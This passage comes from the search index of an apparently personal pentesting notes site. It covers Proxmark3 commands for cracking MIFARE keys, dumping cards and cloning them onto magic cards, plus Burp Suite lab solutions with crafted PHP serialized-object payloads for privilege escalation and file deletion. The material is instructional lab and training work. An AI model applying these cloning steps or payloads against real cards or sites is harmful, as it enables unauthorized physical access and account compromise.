FF FF FF | .........i......\n[=] -----+-----+-------------------------------------------------+-----------------\n\n[+] Saved 1024 bytes to binary file `/home/ME/hf-mf-&lt;UID&gt;-dump.bin`\n[+] Saved to json file `/home/ME/hf-mf-&lt;UID&gt;-dump.json`\n</code></pre> <p>At this point we\u2019ve got everything we need from the card, we can take it off the reader.</p> <p>Now there are two ways to proceed:</p>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#way-1-cload","title":"Way 1: cload","text":"<p>Create an eml file with the previously obtained dump binary file:</p> <pre><code># First go to &lt;yourpath&gt;/proxmark/tools/\ncd proxmark/tools/\n\n# Run the script pm3_mfd2eml.py \n python3 ./pm3_mfd2eml.py /home/PATH/hf-mf-&lt;UI&gt;-dump.bin /home/PATH/hf-mf-UID-dump.eml\n</code></pre> <p>Load the eml file into your magic card:</p> <pre><code>hf mf cload -f /home/PATH/hf-mf-&lt;UID&gt;-dump.eml\n</code></pre>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#way-2-restore","title":"Way 2: restore","text":"<p>To copy that data onto a new card, place the (Chinese backdoor) card on the proxmark:</p> <pre><code>hf mf restore --1k --uid &lt;UID\u00ba&gt; -k /home/ME/hf-mf-&lt;UID&gt;-key.bin\n</code></pre> <p>This restores the dumped data onto the new card. Now we just need to give the card the UID we got from the original hf search command:</p> <pre><code>hf mf csetuid --uid &lt;UID&gt;\n</code></pre>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#resources","title":"Resources","text":"<p>https://jaymonsecurity.com/seguridad-clonar-tarjeta-proxmark-red-team/</p>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-desfire/","title":"Mifare Desfire","text":"","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-desfire/#basic-commands","title":"Basic commands","text":"<pre><code># Recover AIDs by bruteforce\nhf mfdes bruteaid\n</code></pre>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/proxmark3-rdv4.01-setting-up/","title":"Installing proxmark3 RDV4.01 in Kali","text":"<p>Basic usage</p>","tags":["pentesting","RFID pentesting","NFC"]},{"location":"RFID/proxmark3-rdv4.01-setting-up/#preparing-linux","title":"Preparing Linux","text":"<p>In my case, I will create a Virtual environment:</p> <pre><code>mkvirtualenv nfc\n</code></pre> <p>An system upgrade was carried out prior to following these instructions.</p> <p>Update the packages list</p> <pre><code>sudo apt-get update\nsudo apt-get upgrade -y\nsudo apt-get auto-remove -y\n</code></pre> <p>Install the requirements</p> <pre><code>sudo apt-get install --no-install-recommends git ca-certificates build-essential pkg-config libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev libbz2-dev liblz4-dev libbluetooth-dev libpython3-dev libssl-dev libgd-dev\n</code></pre> <p>Clone the repository:</p> <pre><code>git clone https://github.com/RfidResearchGroup/proxmark3.git\n</code></pre> <p>Check ModemManager. Make sure ModemManager will not interfere, otherwise it could brick your Proxmark3! Modem Manager must be discarded. </p> <p>ModemManager is pre-installed on many different Linux distributions, very probably yours as well. It's intended to prepare and configure the mobile broadband (2G/3G/4G) devices, whether they are built-in or dongles. Some are serial, so when the Proxmark3 is plugged and a\u00a0<code>/dev/ttyACM0</code>\u00a0appears, ModemManager attempts to talk to it to see if it's a modem replying to AT commands. Now imagine what happens when you're flashing your Proxmark3 and ModemManager suddenly starts sending bytes to it at the same time... Yes it makes the flashing failing. And if it happens while you're flashing the bootloader, it will require a JTAG device to unbrick the Proxmark3. ModemManager is a threat for the Proxmark3, but also for many other embedded devices, such as some Arduino platforms.</p> <pre><code># Solution 1: remove ModemManager\nsudo apt remove modemmanager\n\n# Solution 2: disable ModemManager\nsudo systemctl stop ModemManager\nsudo systemctl disable ModemManager\n</code></pre> <p>Troubleshooting  issues with ModemManager</p> <p>Connect your device using the USB cable and check that the proxmark is being picked up by your computer:</p> <pre><code>sudo dmesg | grep -i usb\n</code></pre> <p>It should show up as a CDC device:</p> <pre><code>usb 3-3: Product: proxmark3\nusb 3-3: Manufacturer: proxmark.org\nusb 3-3: SerialNumber: iceman\ncdc_acm 3-3:1.0: ttyACM0: USB ACM device\n</code></pre> <p>And a new\u00a0<code>/dev/ttyACM0</code>\u00a0should have appeared:</p> <pre><code>ls -la /dev | grep ttyACM0    \n</code></pre> <p>Get permissions to use /dev/ttyACM0. Add current user to the proper groups to get permission to use\u00a0<code>/dev/ttyACM0</code>. This step can be done from the Iceman Proxmark3 repo with:</p> <pre><code>make accessrights\n</code></pre> <p>Then, you need to logout and login in again for your new group membership to be fully effective.</p> <p>To test you have the proper read &amp; write rights, plug the Proxmark3 and execute:</p> <pre><code>[ -r /dev/ttyACM0 ] &amp;&amp; [ -w /dev/ttyACM0 ] &amp;&amp; echo ok\n</code></pre> <p>It must return ok. Otherwise this means you've got a permission problem to fix.</p>","tags":["pentesting","RFID pentesting","NFC"]},{"location":"RFID/proxmark3-rdv4.01-setting-up/#compilation-instructions-for-rdv4","title":"Compilation instructions for RDV4","text":"<p>The repo defaults for compiling a firmware and client suitable for Proxmark3 RDV4.</p> <p>Get the latest commits:</p> <pre><code>cd proxmark3\ngit pull\n</code></pre> <p>Clean and compile everything:</p> <pre><code>make clean &amp;&amp; make -j\n</code></pre> <p>if you got an error, go to the\u00a0troubleshooting guide. </p> <p>Install, but be carefull, if you do</p> <pre><code>sudo make install\n</code></pre> <p>Then the required files will be installed on your system, by default in\u00a0<code>/usr/local/bin</code>\u00a0and\u00a0<code>/usr/local/share/proxmark3</code>. Maintainers can read\u00a0this doc\u00a0to learn how to modify installation paths via\u00a0<code>DESTDIR</code>\u00a0and\u00a0<code>PREFIX</code>\u00a0Makefile variables.</p> <p>The commands given in the documentation assume you did the installation step. If you didn't, you've to adjust the commands paths and files paths accordingly, e.g. calling\u00a0<code>./pm3</code>\u00a0or\u00a0<code>client/proxmark3</code>\u00a0instead of just\u00a0<code>pm3</code>\u00a0or\u00a0<code>proxmark3</code>.</p> <p>In most cases, you can run the following script which try to auto-detect the port to use, on several OS:</p> <pre><code>pm3-flash-all\n</code></pre> <p>if not working: go to troubleshooting</p> <p>Run the client:  In most cases, you can run the script\u00a0<code>pm3</code>\u00a0which try to auto-detect the port to use, on several OS.</p> <pre><code>./pm3\n</code></pre> <p>For the other cases, specify the port by yourself. For example, for a Proxmark3 connected via USB under Linux. Here, for example, for a Proxmark3 connected via USB under Linux (adjust the port for your OS):</p> <pre><code>proxmark3 /dev/ttyACM0\n</code></pre> <p>or from the local repo</p> <pre><code>client/proxmark3 /dev/ttyACM0\n</code></pre> <p>If all went well you should get some information about the firmware and memory usage as well as the prompt, something like this.</p> <pre><code>[=] Session log /home/iceman/.proxmark3/logs/log_20230208.txt\n[+] loaded from JSON file /home/iceman/.proxmark3/preferences.json\n[=] Using UART port /dev/ttyS3\n[=] Communicating with PM3 over USB-CDC\n\n\n  8888888b.  888b     d888  .d8888b.\n  888   Y88b 8888b   d8888 d88P  Y88b\n  888    888 88888b.d88888      .d88P\n  888   d88P 888Y88888P888     8888\"\n  8888888P\"  888 Y888P 888      \"Y8b.\n  888        888  Y8P  888 888    888\n  888        888   \"   888 Y88b  d88P\n  888        888       888  \"Y8888P\"    [ \u2615 ]\n\n\n [ Proxmark3 RFID instrument ]\n\n    MCU....... AT91SAM7S512 Rev A\n    Memory.... 512 Kb ( 66% used )\n\n    Client.... Iceman/master/v4.16191 2023-02-08 22:54:30\n    Bootrom... Iceman/master/v4.16191 2023-02-08 22:54:26\n    OS........ Iceman/master/v4.16191 2023-02-08 22:54:27\n    Target.... RDV4\n\n[usb] pm3 --&gt;\n</code></pre> <p>This\u00a0<code>[usb] pm3 --&gt;</code> \u00a0is the Proxmark3 interactive prompt.</p>","tags":["pentesting","RFID pentesting","NFC"]},{"location":"RFID/proxmark3-rdv4.01-setting-up/#configuration-and-verification","title":"Configuration and Verification","text":"<p>Verify the status of your installation with:</p> <pre><code>script run init_rdv4\n</code></pre> <p>To make sure you got the latest sim module firmware:</p> <pre><code>hw status\n</code></pre> <p>If you get a message such as:</p> <pre><code>[#] Smart card module (ISO 7816)\n[#]   version................. vX.XX ( Outdated )\n</code></pre> <p>Then, the version is obsolete and you will need to update it. The following command upgrades your device sim module firmware. Don't not turn off your device during the execution of this command!! Even its a quite fast command you should be warned. You may brick it if you interrupt it.</p> <pre><code>smart upgrade -f /usr/local/share/proxmark3/firmware/sim014.bin\n\n# or if from local repo\nsmart upgrade -f sim014.bin\n</code></pre> <p>You get the following output if the execution was successful:</p> <pre><code>[=] --------------------------------------------------------------------\n[!] \u26a0\ufe0f  WARNING - sim module firmware upgrade\n[!] \u26a0\ufe0f  A dangerous command, do wrong and you could brick the sim module\n[=] --------------------------------------------------------------------\n\n[=] firmware file       sim014.bin\n[=] Checking integrity  sim014.sha512.txt\n[+] loaded 3658 bytes from binary file sim014.bin\n[+] loaded 158 bytes from binary file sim014.sha512.txt\n[=] Don't turn off your PM3!\n[+] Sim module firmware uploading to PM3...\n \ud83d\udd51 3658 bytes sent\n[+] Sim module firmware updating...\n[#] FW 0000\n[#] FW 0080\n[#] FW 0100\n[#] FW 0180\n[#] FW 0200\n[#] FW 0280\n[#] FW 0300\n[#] FW 0380\n[#] FW 0400\n[#] FW 0480\n[#] FW 0500\n[#] FW 0580\n[#] FW 0600\n[#] FW 0680\n[#] FW 0700\n[#] FW 0780\n[#] FW 0800\n[#] FW 0880\n[#] FW 0900\n[#] FW 0980\n[#] FW 0A00\n[#] FW 0A80\n[#] FW 0B00\n[#] FW 0B80\n[#] FW 0C00\n[#] FW 0C80\n[#] FW 0D00\n[#] FW 0D80\n[#] FW 0E00\n[+] Sim module firmware upgrade successful    \n</code></pre> <p>Run hw status command to verify that the upgrade went well.</p> <pre><code>hw status\n</code></pre>","tags":["pentesting","RFID pentesting","NFC"]},{"location":"RFID/proxmark3/","title":"Using Proxmark3 RDV4.01","text":"<p>Installation: Installing proxmark3 RDV4.01 in Kali</p>","tags":["pentesting","NFC","pentesting"]},{"location":"RFID/proxmark3/#basic-commands","title":"Basic commands","text":"<pre><code># The prompt will have this appearance\n[usb] pm3 --&gt; \n\n# Display help and commands\nhelp\n\n# Close the client\nquit\n</code></pre> <p>To get an overview of the available commands for LF RFID and HF RFID:</p> <pre><code>[usb] pm3 --&gt; lf\n[usb] pm3 --&gt; hf\n</code></pre> <p>To search quickly for known LF or HF tags:</p> <pre><code>[usb] pm3 --&gt; lf search\n[usb] pm3 --&gt; hf search\n</code></pre> <p>To get info on a ISO14443-A tag:</p> <pre><code>[usb] pm3 --&gt; hf 14a info\n</code></pre> <p>Read and write:</p> <pre><code># Read sector 1 with key FFFFFFFFFFFF\nhf mf rdsc -s 1 -k FFFFFFFFFFFF\n\n# Read block 13 with key FFFFFFFFFFFF\nhf mf rdbl --blk 13 -k FFFFFFFFFFFF\n\n# Write block 8 with key a FFFFFFFFFFFF \nhf mf wrbl --blk 8 -a -k FFFFFFFFFFFF -d FFFFFFFFFFFF7F078800FFFFFFFFFFFF\n</code></pre> <p>Getting keys</p> <pre><code># Check all sectors, all keys, 1K, and write to file\nhf mf chk --1k --dump             \n\n# Check for default keys:\nhf mf chk --1k -f mfc_default_keys\n\n# Check dictionary against block 0, key A\nhf mf chk -a --tblk 0 -f mfc_default_keys.dic       \n\n# Run autopwn, to extract all keys and backup a MIFARE Classic tag\nhf mf autopwn\n\n\nhf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF --dump\n\n# Dump MIFARE Classic card contents:\nhf mf dump\nhf mf dump --1k -k hf-mf-A29558E4-key.bin -f hf-mf-A29558E4-dump.bin\n\n\n# Write to MIFARE Classic block:\nhf mf wrbl --blk 0 -k FFFFFFFFFFFF -d d3a2859f6b880400c801002000000016\n\n\n# Bruteforce MIFARE Classic card numbers from 11223344 to 11223346:\nscript run hf_mf_uidbruteforce -s 0x11223344 -e 0x11223346 -t 1000 -x mfc\n\n# Bruteforce MIFARE Ultralight EV1 card numbers from 11223344556677 to 11223344556679\nscript run hf_mf_uidbruteforce -s 0x11223344556677 -e 0x11223344556679 -t 1000 -x mfu\n</code></pre>","tags":["pentesting","NFC","pentesting"]},{"location":"RFID/proxmark3/#next-steps","title":"Next steps","text":"<ul> <li>https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/cheatsheet.md</li> <li>https://github.com/Proxmark/proxmark3/wiki/Generic-ISO14443-Ops</li> <li>https://github.com/RfidResearchGroup/proxmark3/wiki/More-cheat-sheets</li> </ul>","tags":["pentesting","NFC","pentesting"]},{"location":"RFID/rfid/","title":"RFID","text":"<p>RFID Reader continuously sends Radio Waves. When the Tag is in the range it sends its feedback signals to the read.</p> <p>Types of RFID Frequencies. There are Three Basic Types of RFID Frequencies:</p> <ul> <li>Low Frequency (LF) 125 kHz or 134 kHz Range 8-10 cm</li> <li>High Frequency (HF) 13.56 MHz Range approx. 1 m </li> <li>Ultra High Frequency (UHF) 860-960 MHz Range 10 - 15 m</li> </ul>","tags":["pentesting","RFID"]},{"location":"RFID/rfid/#quick-overview-of-arduino","title":"Quick Overview of Arduino","text":"<ul> <li>Arduino is an open-source hardware </li> <li>Single board with microcontroller (ATmega328P ) </li> <li>Attach different modules and sensors</li> <li>Different versions of Arduino</li> </ul> <p>Download Arduino IDE.</p>","tags":["pentesting","RFID"]},{"location":"RFID/rfid/#requirements","title":"Requirements","text":"<p>RFID Cards we need. - Mifare classic cards (1K, 4K, EV1): UID is not changeable. - Magic cards: In magic cards, UID is changeable.</p> <p>For programming Mifare we will use</p> <ul> <li>ACR122u</li> <li>MFRC522 with STMB</li> <li>USB to TTL</li> <li>STM8 &amp; STM32 USB </li> <li>Jumper wires (female to female)</li> </ul> <p>More tools require: </p> <ul> <li>Arduino UNO</li> <li>RC522 Module</li> <li>OLED 4 Pin</li> <li>Breadboard</li> <li>Jumper wires</li> <li>Buzzer</li> </ul>","tags":["pentesting","RFID"]},{"location":"burpsuite/burpsuite-broken-access-control/","title":"BurpSuite Labs - Broken access control vulnerabilities","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#unprotected-admin-functionality","title":"Unprotected admin functionality","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation","title":"Enunciation","text":"<p>This lab has an unprotected admin panel.</p> <p>Solve the lab by deleting the user\u00a0<code>carlos</code>.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution","title":"Solution","text":"<p>See the robots.txt page. Enter the admin panel url in the browser and delete the user carlos.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#unprotected-admin-functionality-with-unpredictable-url","title":"Unprotected admin functionality with unpredictable URL","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_1","title":"Enunciation","text":"<p>This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.</p> <p>Solve the lab by accessing the admin panel, and using it to delete the user\u00a0<code>carlos</code>.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_1","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#user-role-controlled-by-request-parameter","title":"User role controlled by request parameter","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_2","title":"Enunciation","text":"<p>This lab has an admin panel at\u00a0<code>/admin</code>, which identifies administrators using a forgeable cookie.</p> <p>Solve the lab by accessing the admin panel and using it to delete the user\u00a0<code>carlos</code>.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_2","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#user-role-can-be-modified-in-user-profile","title":"User role can be modified in user profile","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_3","title":"Enunciation","text":"<p>This lab has an admin panel at\u00a0<code>/admin</code>. It's only accessible to logged-in users with a\u00a0<code>roleid</code>\u00a0of 2.</p> <p>Solve the lab by accessing the admin panel and using it to delete the user\u00a0<code>carlos</code>.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_3","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#url-based-access-control-can-be-circumvented","title":"URL-based access control can be circumvented","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_4","title":"Enunciation","text":"<p>This website has an unauthenticated admin panel at <code>/admin</code>, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the <code>X-Original-URL</code> header.</p> <p>To solve the lab, access the admin panel and delete the user <code>carlos</code>.`</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_4","title":"Solution","text":"<p>You will see a 302 and following the redirection, a 403,  BUT update the lab page and you will see that lab was successfully passed.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#method-based-access-control-can-be-circumvented","title":"Method-based access control can be circumvented","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_5","title":"Enunciation","text":"<p>This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials\u00a0<code>administrator:admin</code>.</p> <p>To solve the lab, log in using the credentials\u00a0<code>wiener:peter</code>\u00a0and exploit the flawed access controls to promote yourself to become an administrator.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_5","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#user-id-controlled-by-request-parameter","title":"User ID controlled by request parameter","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_6","title":"Enunciation","text":"<p>This lab has a horizontal privilege escalation vulnerability on the user account page.</p> <p>To solve the lab, obtain the API key for the user\u00a0<code>carlos</code>\u00a0and submit it as the solution.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_6","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#user-id-controlled-by-request-parameter-with-unpredictable-user-ids","title":"User ID controlled by request parameter, with unpredictable user IDs","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_7","title":"Enunciation","text":"<p>This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.</p> <p>To solve the lab, find the GUID for <code>carlos</code>, then submit his API key as the solution.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_7","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#user-id-controlled-by-request-parameter-with-data-leakage-in-redirect","title":"User ID controlled by request parameter with data leakage in redirect","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_8","title":"Enunciation","text":"<p>This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.</p> <p>To solve the lab, obtain the API key for the user <code>carlos</code> and submit it as the solution.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_8","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#user-id-controlled-by-request-parameter-with-password-disclosure","title":"User ID controlled by request parameter with password disclosure","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_9","title":"Enunciation","text":"<p>This lab has user account page that contains the current user's existing password, prefilled in a masked input.</p> <p>To solve the lab, retrieve the administrator's password, then use it to delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_9","title":"Solution","text":"<p>Log in as administrator, go to the admin panel, and delete carlos.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#insecure-direct-object-references","title":"Insecure direct object references","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_10","title":"Enunciation","text":"<p>This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.</p> <p>Solve the lab by finding the password for the user <code>carlos</code>, and logging into their account.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_10","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#multi-step-process-with-no-access-control-on-one-step","title":"Multi-step process with no access control on one step","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_11","title":"Enunciation","text":"<p>This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials\u00a0<code>administrator:admin</code>.</p> <p>To solve the lab, log in using the credentials\u00a0<code>wiener:peter</code>\u00a0and exploit the flawed access controls to promote yourself to become an administrator.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_11","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#referer-based-access-control","title":"Referer-based access control","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#enunciation_12","title":"Enunciation","text":"<p>This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials\u00a0<code>administrator:admin</code>.</p> <p>To solve the lab, log in using the credentials\u00a0<code>wiener:peter</code>\u00a0and exploit the flawed access controls to promote yourself to become an administrator.</p>","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-broken-access-control/#solution_12","title":"Solution","text":"","tags":["burpsuite","ssrf"]},{"location":"burpsuite/burpsuite-insecure-deserialization/","title":"BurpSuite Labs - Insecure deserialization","text":"","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#modifying-serialized-objects","title":"Modifying serialized objects","text":"<p>APPRENTICE Modifying serialized objects</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation","title":"Enunciation","text":"<p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user <code>carlos</code>.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution","title":"Solution","text":"<pre><code># Burp solution\n\n1. Log in using your own credentials. Notice that the post-login `GET /my-account` request contains a session cookie that appears to be URL and Base64-encoded.\n2. Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The `admin` attribute contains `b:0`, indicating the boolean value `false`. Send this request to Burp Repeater.\n3. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the `admin` attribute to `b:1`. Click \"Apply changes\". The modified object will automatically be re-encoded and updated in the request.\n4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have accessed the page with admin privileges.\n5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.\n6. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#modifying-serialized-data-types","title":"Modifying serialized data types","text":"<p>PRACTITIONER Modifying serialized data types</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_1","title":"Enunciation","text":"<p>This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.</p> <p>You can log in to your own account using the following credentials: wiener:peter </p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_1","title":"Solution","text":"<p>Capture the Cookie session of the regular user wiener:peter. Send a request containing the cookie to Repeater module. Use the inspector to modify the value of the cookie:</p> <p>Original values:</p> <pre><code>O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"bzz9fbv8uzas714errnha1q5ppbzyf5h\";}\n</code></pre> <p></p> <p>Crafted values:</p> <pre><code>O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;}\n</code></pre> <p>What we did:</p> <ul> <li>Update the length of the <code>username</code> attribute to <code>13</code>.</li> <li>Change the username to <code>administrator</code>.</li> <li>Change the access token to the integer <code>0</code>. As this is no longer a string, you also need to remove the double-quotes surrounding the value.</li> <li>Update the data type label for the access token by replacing <code>s</code> with <code>i</code>.</li> </ul> <p></p> <pre><code># Burp solution\n1. Log in using your own credentials. In Burp, open the post-login `GET /my-account` request and examine the session cookie using the Inspector to reveal a serialized PHP object. Send this request to Burp Repeater.\n2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows:\n\n    - Update the length of the `username` attribute to `13`.\n    - Change the username to `administrator`.\n    - Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.\n    - Update the data type label for the access token by replacing `s` with `i`.\n\n    The result should look like this:\n\n    `O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;}`\n3. Click \"Apply changes\". The modified object will automatically be re-encoded and updated in the request.\n4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have successfully accessed the page as the `administrator` user.\n5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.\n6. Change the path of your request to `/admin/delete?username=carlos` and send the request to solve the lab.\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#using-application-functionality-to-exploit-insecure-deserialization","title":"Using application functionality to exploit insecure deserialization","text":"<p>PRACTITIONER Using application functionality to exploit insecure deserialization</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_2","title":"Enunciation","text":"<p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the <code>morale.txt</code> file from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p> <p>You also have access to a backup account: <code>gregg:rosebud</code></p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_2","title":"Solution","text":"<p>In the user profile there is a DELETE feature that allows users to delete their profile. When doing so, the functionality of the application is relaying on the path provided in the cookie session (which is part of the user object) to remove the avatar.</p> <p></p> <p>Exploit would be changing the path to a file that we want to remove and update the string length of the path.</p> <p></p> <pre><code># Burp solution\n1. Log in to your own account. On the \"My account\" page, notice the option to delete your account by sending a `POST` request to `/my-account/delete`.\n2. Send a request containing a session cookie to Burp Repeater.\n3. In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an `avatar_link` attribute, which contains the file path to your avatar.\n4. Edit the serialized data so that the `avatar_link` points to `/home/carlos/morale.txt`. Remember to update the length indicator. The modified attribute should look like this:\n\n    `s:11:\"avatar_link\";s:23:\"/home/carlos/morale.txt\"`\n5. Click \"Apply changes\". The modified object will automatically be re-encoded and updated in the request.\n6. Change the request line to `POST /my-account/delete` and send the request. Your account will be deleted, along with Carlos's `morale.txt` file.\n</code></pre>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#arbitrary-object-injection-in-php","title":"Arbitrary object injection in PHP","text":"<p>PRACTITIONER Arbitrary object injection in PHP</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#enunciation_3","title":"Enunciation","text":"<p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the <code>morale.txt</code> file from Carlos's home directory. You will need to obtain source code access to solve this lab.</p> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p> <p>You can sometimes read source code by appending a tilde (<code>~)</code> to a filename to retrieve an editor-generated backup file.</p>","tags":["burpsuite","deserialization"]},{"location":"burpsuite/burpsuite-insecure-deserialization/#solution_3","title":"Solution","text":"<p>Review the code and notice CustomerTemplate.php</p> <p></p> <p>Read the file by adding a virgule and find an interesting method:</p> <p></p> <p>The cookie session consisted on a serialized object. </p> <p></p> <p>We will craft a seriealized object that triggers the interested method allocated in CustomTemplate.php and pass it base-64 encoded via the Inspector module:</p> <pre><code>O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";}\n</code></pre> <p></p> <p>Run the request!</p> <pre><code># Burp solution\n1. Log in to your own account and notice the session cookie contains a serialized PHP object.\n2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Right-click on the file and select \"Send to Repeater\".\n3. In Burp Repeater, notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.\n4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.\n5. In Burp 